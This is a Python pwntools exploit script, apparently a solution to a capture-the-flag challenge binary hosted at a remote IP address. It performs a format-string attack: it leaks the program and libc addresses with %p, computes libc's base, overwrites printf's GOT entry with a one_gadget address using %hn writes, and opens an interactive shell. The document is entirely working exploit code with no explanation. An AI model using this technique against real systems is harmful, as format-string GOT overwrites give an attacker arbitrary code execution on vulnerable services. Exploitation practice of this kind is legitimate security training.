#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
#p = process()
p = remote('34.29.214.123', 5000)
#gdb.attach(p,gdbscript='''
#           brva 0x0000000000001221
#           ''')
input()
payload = b'%21065c%9$hn'
payload = payload.ljust(17,b'a')
p.send(payload+ p16(0x8018))
p.send(b'|%25$p|%21$p|')
p.recvuntil(b'|')
main = int(p.recvuntil(b'|')[:-1],16)
exe.address = main - exe.sym.main
libc_leak = int(p.recvuntil(b'|')[:-1],16) 
libc.address = libc_leak - 0x2a1ca
system = libc.sym.system
print(hex(main))
print(hex(libc.address))
print(hex(system))
one_gadget = [0x583dc,0x583e3,0xef4ce,0xef52b]
log.info(f'one_gadget1: {hex(libc.address + one_gadget[3])}')
package = {
        libc.address+one_gadget[3] & 0xffff: exe.got.printf,
        libc.address+one_gadget[3] >> 16 & 0xffff: exe.got.printf+2,
    }
order = sorted(package)
payload = f'%{order[0]}c%11$hn'.encode()
payload += f'%{order[1] - order[0]}c%12$hn'.encode()
payload = payload.ljust(33,b'a')
payload += flat(
    package[order[0]],
    package[order[1]],
    )
p.send(payload)
p.send(b'a')
p.interactive()



